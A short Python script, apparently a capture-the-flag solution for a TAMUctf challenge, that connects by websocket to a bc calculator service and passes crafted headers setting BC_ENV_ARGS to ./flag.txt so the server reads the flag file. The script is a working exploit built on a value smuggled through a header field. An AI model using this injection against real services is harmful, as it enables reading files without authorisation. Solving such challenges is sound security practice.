#!/usr/bin/env python3

# pip install websocket_client
import websocket

if __name__ == '__main__':
	ws = websocket.WebSocket()
	ws.connect("ws://challenges.tamuctf.com:3012/", header=["BC_LINE_LENGTH: 200", "BC_ENV_ARGS: ./flag.txt"])

	while(True):
		query = input("calc: ")
		ws.send(query + "\n")

		result = ws.recv()
		print("Received '%s'" % str(result.decode("utf-8")))
	ws.close()
